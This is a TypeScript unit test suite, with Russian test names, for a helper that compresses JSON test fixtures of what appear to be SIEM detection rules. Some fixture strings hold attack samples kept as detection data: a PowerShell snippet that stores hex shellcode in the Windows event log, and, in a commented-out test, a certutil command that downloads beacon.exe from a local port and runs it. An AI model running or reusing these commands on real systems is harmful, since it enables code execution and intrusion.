import * as assert from 'assert';
import { TestHelper } from '../../helpers/testHelper';

suite('TestHelper.compressTestCode', async () => {
  test('В поле JSON-а скрипт с символами доллара', async () => {
    const formatted = `table_list {
	"Common_whitelist_auto": [
		{
			"rule": "RuleName",
			"specific_value": "$payload = 'fc4883e4f0e8c0000000415141505251564831d265488b5260488b5218488b5220488b7250480fb74a4a4d31c94831c0ac3c617c022c2041c1c90d4101c1e2ed524151488b52208b423c4801d08b80880000004885c074674801d0508b4818448b40204901d0e35648ffc9418b34884801d64d31c94831c0ac41c1c90d4101c138e075f14c034c24084539d175d858448b40244901d066418b0c48448b401c4901d0418b04884801d0415841585e595a41584159415a4883ec204152ffe05841595a488b12e957ffffff5d48ba0100000000000000488d8d0101000041ba318b6f87ffd5bbf0b5a25641baa695bd9dffd54883c4283c067c0a80fbe07505bb4713726f6a00594189daffd563616c632e65786500'$hashbytearray = [byte[]] ($payload -replace '..', '0x$&,' -split ',' -ne '')write-eventlog -logname 'key management service' -source kmsrequests -entrytype information -eventid 31337 -category 0 -message 'here be dragons' -rawdata $hashbytearray"
		}
	]
}`;
    const compressed = `table_list {"Common_whitelist_auto":[{"rule":"RuleName","specific_value":"$payload = 'fc4883e4f0e8c0000000415141505251564831d265488b5260488b5218488b5220488b7250480fb74a4a4d31c94831c0ac3c617c022c2041c1c90d4101c1e2ed524151488b52208b423c4801d08b80880000004885c074674801d0508b4818448b40204901d0e35648ffc9418b34884801d64d31c94831c0ac41c1c90d4101c138e075f14c034c24084539d175d858448b40244901d066418b0c48448b401c4901d0418b04884801d0415841585e595a41584159415a4883ec204152ffe05841595a488b12e957ffffff5d48ba0100000000000000488d8d0101000041ba318b6f87ffd5bbf0b5a25641baa695bd9dffd54883c4283c067c0a80fbe07505bb4713726f6a00594189daffd563616c632e65786500'$hashbytearray = [byte[]] ($payload -replace '..', '0x$&,' -split ',' -ne '')write-eventlog -logname 'key management service' -source kmsrequests -entrytype information -eventid 31337 -category 0 -message 'here be dragons' -rawdata $hashbytearray"}]}`;

    const actual = TestHelper.compressTestCode(formatted);
    assert.strictEqual(actual, compressed);
  });

  test('Табуляция после события', async () => {
    const formatted = `expect 1 {
	"correlation_name": null, 
	"object.process.cmdline": "c:\\\\windows\\\\whoami.exe"
}`;

    const compressed = `expect 1 {"correlation_name":null,"object.process.cmdline":"c:\\\\windows\\\\whoami.exe"}`;

    const actual = TestHelper.compressTestCode(formatted);
    assert.strictEqual(actual, compressed);
  });

  // 	test('Пробельные символы перед символом новой строки', async () => {

  // 		const formatted =
  // `expect 1 {
  // 	"correlation_name": null,
  // 	"object.process.cmdline": "c:\\\\windows\\\\system32\\\\certutil.exe -urlcache -split -f http://127.0.0.1:4444/beacon.exe c:\\\\windows\\\\temp\\\\beacon.exe & c:\\\\windows\\\\temp\\\\beacon.exe"
  // 	}`;

  // 		const compressed = `expect 1 {"correlation_name":null,"object.process.cmdline":"c:\\\\windows\\\\system32\\\\certutil.exe -urlcache -split -f http://127.0.0.1:4444/beacon.exe c:\\\\windows\\\\temp\\\\beacon.exe & c:\\\\windows\\\\temp\\\\beacon.exe"}`;

  // 		const actual = TestHelper.compressTestCode(formatted);
  // 		assert.strictEqual(actual, compressed);
  // 	});

  test('Корректная обработка localhost ipv6', async () => {
    const formatted = `{\r\n` + `    "src.host": "::1",\r\n` + `    "src.ip": "::1"\r\n` + `}`;

    const compressed = `{"src.host":"::1","src.ip":"::1"}`;

    const actual = TestHelper.compressTestCode(formatted);
    assert.strictEqual(actual, compressed);
  });

  // Текстовые события
  test('Неизменность одного текстого события при сжатии', async () => {
    const textEvent = `2022-07-20 07:03:38 W3SVC2 mail-srv 10.0.2.216 POST /Microsoft-Server-ActiveSync/Proxy/default.eas User=user@domain.com&DeviceId=00000000000000000000000001&DeviceType=iPhone&Cmd=Ping&Log=SC1:1_PrxFrom:10.20.52.208_Ver1:161_HH:mail.domain.com_SmtpAdrs:user%40domain.com_Hb:600_Rto:2_Cpo:656_Fet:600000_Mbx:mail-srv.domain.ru_Cafe:DC2-MBX-03.domain.RU_Dc:dc-srv.domain.ru_Throttle:0_SBkOffD:L%2f-470_TmRcv:06:53:38.4480003_TmSt:06:53:38.4519947_TmFin:06:53:38.4519947_TmCmpl:07:03:38.440522_TmCnt:07:03:37.7834641_Budget:(A)Owner%3aS-1-5-21-1023191730-727829927-3110000192-14176%5F00000000000000000000000001%5FiPhone%2cConn%3a0%2cMaxConn%3a10%2cMaxBurst%3a480000%2cBalance%3a480000%2cCutoff%3a600000%2cRechargeRate%3a1800000%2cPolicy%3aGlobalThrottlingPolicy%5F5c9d3d31-7f05-4e14-b8f8-05780608b52f%2cIsServiceAccount%3aFalse%2cLiveTime%3a00%3a00%3a30.6952647%3b(D)Owner%3aS-1-5-21-1023191730-727829927-3110000192-14176%5F00000000000000000000000001%5FiPhone%2cConn%3a0%2cMaxConn%3a10%2cMaxBurst%3a480000%2cBalance%3a480000%2cCutoff%3a600000%2cRechargeRate%3a1800000%2cPolicy%3aGlobalThrottlingPolicy%5F5c9d3d31-7f05-4e14-b8f8-05780608b52f%2cIsServiceAccount%3aFalse%2cLiveTime%3a00%3a00%3a00.6580618_ActivityContextData:ActivityID%3d0483abd0-f1d6-44e7-bfe8-e951e242b7bd%3bI32%3aADS.C%5bdc-srv%5d%3d1%3bF%3aADS.AL%5bdc-srv%5d%3d1.62791%3bI32%3aATE.C%5bdc-srv.domain.com%5d%3d1%3bF%3aATE.AL%5bdc-srv.domain.com%5d%3d0%3bS%3aWLM.Bal%3d480000%3bS%3aWLM.BT%3dEas_ 444 domain\\user 10.0.12.18 HTTP/1.1 Apple-iPhone11C6/1905.258 - - mail-srv.domain.com:444 200 0 0 600013 9.9.2.21,+10.0.11.6,+10.23.2.29,10.40.24.96`;

    const compressTestCode = TestHelper.compressTestCode(textEvent);
    assert.strictEqual(compressTestCode, textEvent);
  });

  test('Если новая строка только через /n, так бывает если забирать из вебки', async () => {
    const compressedTestCode =
      `#4778\n` +
      `table_list default\n` +
      `table_list {\n` +
      `    "ESC_Auto_Profile": [\n` +
      `         {\n` +
      `            "rule": "Subrule_Unauthorized_Access_User_PC",\n` +
      `            "auto_profiling": 1\n` +
      `        }\n` +
      `    ],\n` +
      `    "ESC_Risk_Assets": [\n` +
      `        {\n` +
      `            "risk_type": "money",\n` +
      `            "access_type": "user_pc",\n` +
      `            "asset_host": "irogachev.domain.com",\n` +
      `            "asset_ip": "",\n` +
      `            "description": "компьютер главного казначея"\n` +
      `        }\n` +
      `    ]\n` +
      `}` +
      `\n` +
      `expect 1 {\n` +
      `    "correlation_name": "Subrule_Unauthorized_Access_User_PC"\n` +
      `}\n`;

    TestHelper.compressTestCode(compressedTestCode);
  });

  test('Сжатие небольшого примера отформатированного события', async () => {
    const formatedTestCode =
      `{\r\n` +
      `"subject.account.name": "admin",\r\n` +
      `"mime": "text/plain",\r\n` +
      `"category.low": "Communication"\r\n` +
      `}`;

    const actual = TestHelper.compressTestCode(formatedTestCode);

    const expected = `{"subject.account.name":"admin","mime":"text/plain","category.low":"Communication"}`;
    assert.strictEqual(expected, actual);
  });

  test('Новая строка с возвратом коретки', async () => {
    const formattedTestCode = `{\r\n"subject.account.name": "admin",\r\n"mime": "text/plain",\r\n"category.low": "Communication"\r\n}`;

    const compressedTestCode = TestHelper.compressTestCode(formattedTestCode);

    const expected = `{"subject.account.name":"admin","mime":"text/plain","category.low":"Communication"}`;
    assert.strictEqual(compressedTestCode, expected);
  });

  test('Сжатие полноценного отформатированного события', async () => {
    const formatedTestCode =
      `{\r\n` +
      `    "subject.account.name": "admin",\r\n` +
      `    "mime": "text/plain",\r\n` +
      `    "category.low": "Communication",\r\n` +
      `    "labels": "|anomaly_access",\r\n` +
      `    "subject": "account",\r\n` +
      `    "id": "Vendor_US_WebUI_Auth",\r\n` +
      `    "event_src.vendor": "vendor",\r\n` +
      `    "object": "application",\r\n` +
      `    "event_src.category": "Web server",\r\n` +
      `    "event_src.hostname": "gus",\r\n` +
      `    "src.ip": "10.1.3.2",\r\n` +
      `    "taxonomy_version": "25.0.577-develop",\r\n` +
      `    "event_src.title": "us",\r\n` +
      `    "category.high": "Access Management",\r\n` +
      `    "src.host": "10.1.3.2",\r\n` +
      `    "action": "login",\r\n` +
      `    "time": "2022-01-25T12:19:22Z",\r\n` +
      `    "importance": "medium",\r\n` +
      `    "count": 1,\r\n` +
      `    "event_src.host": "gus",\r\n` +
      `    "input_id": "00000000-0000-0000-0000-000000000000",\r\n` +
      `    "status": "success",\r\n` +
      `    "generator.type": "logcollector",\r\n` +
      `    "recv_time": "2022-02-03T12:17:32Z",\r\n` +
      `    "generator.version": "N25.0.2630",\r\n` +
      `    "uuid": "62950de1-1ac2-4f54-8e52-8493e5850509",\r\n` +
      `    "type": "raw",\r\n` +
      `    "recv_ipv4": "127.0.0.1",\r\n` +
      `    "body": "<190>Jan 25 12:19:22 gus auth-ui: 2022-01-25 12:19:22,200 DEBUG login user: admin via ip: 10.1.3.2",\r\n` +
      `    "task_id": "00000000-0000-0000-0000-000000000000",\r\n` +
      `    "normalized": true,\r\n` +
      `    "category.generic": "Application"\r\n` +
      `}`;

    const actual = TestHelper.compressTestCode(formatedTestCode);

    const extected = `{"subject.account.name":"admin","mime":"text/plain","category.low":"Communication","labels":"|anomaly_access","subject":"account","id":"Vendor_US_WebUI_Auth","event_src.vendor":"vendor","object":"application","event_src.category":"Web server","event_src.hostname":"gus","src.ip":"10.1.3.2","taxonomy_version":"25.0.577-develop","event_src.title":"us","category.high":"Access Management","src.host":"10.1.3.2","action":"login","time":"2022-01-25T12:19:22Z","importance":"medium","count":1,"event_src.host":"gus","input_id":"00000000-0000-0000-0000-000000000000","status":"success","generator.type":"logcollector","recv_time":"2022-02-03T12:17:32Z","generator.version":"N25.0.2630","uuid":"62950de1-1ac2-4f54-8e52-8493e5850509","type":"raw","recv_ipv4":"127.0.0.1","body":"<190>Jan 25 12:19:22 gus auth-ui: 2022-01-25 12:19:22,200 DEBUG login user: admin via ip: 10.1.3.2","task_id":"00000000-0000-0000-0000-000000000000","normalized":true,"category.generic":"Application"}`;
    assert.strictEqual(actual, extected);
  });

  test('Сжатие ТС с одной таблицей', async () => {
    const formattedCode =
      `table_list {\r\n` +
      `    "ESC_Auto_Profile": [\r\n` +
      `        {\r\n` +
      `            "rule": "ESC_Anomaly_Access_Gitlab_App",\r\n` +
      `            "auto_profiling": 1\r\n` +
      `        }\r\n` +
      `    ]\r\n` +
      `}`;

    const actual = TestHelper.compressTestCode(formattedCode);

    const expected = `table_list {"ESC_Auto_Profile":[{"rule":"ESC_Anomaly_Access_Gitlab_App","auto_profiling":1}]}`;
    assert.strictEqual(actual, expected);
  });

  test('Сжатие ТС с одной таблицей и одного события', async () => {
    const formattedCode =
      `table_list {\r\n` +
      `   "ESC_Auto_Profile": [\r\n` +
      `       {\r\n` +
      `            "rule": "ESC_Anomaly_Access_Gitlab_App",\r\n` +
      `            "auto_profiling": 1\r\n` +
      `       }\r\n` +
      `    ]\r\n` +
      `}\r\n` +
      `\r\n` +
      `{\r\n` +
      `    "subject.account.name": "admin",\r\n` +
      `    "mime": "text/plain",\r\n` +
      `    "category.low": "Communication"\r\n` +
      `}`;

    const actual = TestHelper.compressTestCode(formattedCode);

    const expected =
      `table_list {"ESC_Auto_Profile":[{"rule":"ESC_Anomaly_Access_Gitlab_App","auto_profiling":1}]}\r\n` +
      `\r\n` +
      `{"subject.account.name":"admin","mime":"text/plain","category.low":"Communication"}`;

    assert.strictEqual(actual, expected);
  });
});
